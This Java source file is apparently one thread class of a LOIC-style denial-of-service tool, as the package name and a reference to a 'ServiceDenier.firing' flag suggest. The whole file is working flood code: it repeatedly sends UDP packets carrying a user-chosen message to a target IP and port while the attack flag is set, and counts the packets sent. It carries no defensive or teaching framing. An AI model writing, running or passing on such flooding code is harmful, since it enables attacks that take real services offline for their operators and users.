package genius.mohammad.loic;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

public class UDPSocketThread implements Runnable {

	private String ip, message;
	private int port, pause;
	
	public static long startTime = 0;
	public static int count = 0;

	public UDPSocketThread(String ip, int port, String message, int pause) {
		this.ip = ip;
		this.port = port;
		this.message = message;
		this.pause = pause;
	}

	public void run() {
		count = 0;
		startTime = System.currentTimeMillis();
		while (ServiceDenier.firing) {
			try {
				DatagramSocket clientSocket = new DatagramSocket();
				InetAddress IPAddress = InetAddress.getByName(ip);
				byte[] sendData = new byte[1024];
				sendData = message.getBytes();
				DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, IPAddress, port);
				clientSocket.send(sendPacket);
				count++;
				Thread.sleep(pause);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
}
